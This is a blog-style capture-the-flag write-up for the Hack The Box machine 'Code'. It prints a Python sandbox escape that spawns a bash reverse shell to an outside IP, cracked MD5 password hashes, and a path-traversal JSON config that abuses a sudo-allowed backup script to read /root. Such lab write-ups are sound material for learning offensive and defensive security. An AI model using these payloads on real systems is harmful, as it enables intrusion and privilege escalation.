---
layout: post
title: HTB - Code (Easy)
permalink: /htbcode
---

We begin with an `nmap` scan, which reveals the following open ports:

- **22/tcp** – SSH  
- **5000/tcp** – HTTP

## Owning User

### Web Enumeration & Python Sandbox Escape

On port **5000**, we find a web application that provides access to a restricted Python interpreter. The sandbox environment blacklists critical keywords, making typical exploitation attempts fail.

To bypass the blacklist, we use a known Python sandbox escape technique that leverages Python's class hierarchy introspection to access dangerous modules indirectly:

```python
subclasses = (()).__class__.__mro__[-1].__subclasses__()
```

This provides access to all subclasses of Python’s `object`. Searching through the list, we find that the subclass at index `317` is `Popen`, which can be used to spawn a reverse shell:

```python
subclasses[317](['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.127/6969 0>&1'])
```

We set up a listener and catch a reverse shell, gaining access to the machine as a low-privileged user. From here, we read `user.txt`.

## Owning Root

### SQLite Database Enumeration

While exploring the instance, we find an SQLite database file. Dumping the `users` table reveals two MD5 hashes:

```
759b74ce43947f5f4c91aeddc3e5bad3  --> development  
3de6f30c4a09c27fc71932bfc68474be  --> nafeelswordsmaster
```

Cracking the hashes gives us plaintext credentials. We use these to SSH into the machine as user **martin**.

### Privilege Escalation via backy.sh

Running `sudo -l` as **martin**, we find:

```
(ALL) NOPASSWD: /usr/bin/backy.sh
```

This script accepts a JSON configuration and archives specified directories. We craft the following configuration to perform a path traversal attack and include the `/root` directory:

```json
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/../root/"
  ]
}
```

We execute the script with `sudo`, and it creates an archive containing files from `/root/`. Extracting the archive allows us to access `root.txt`.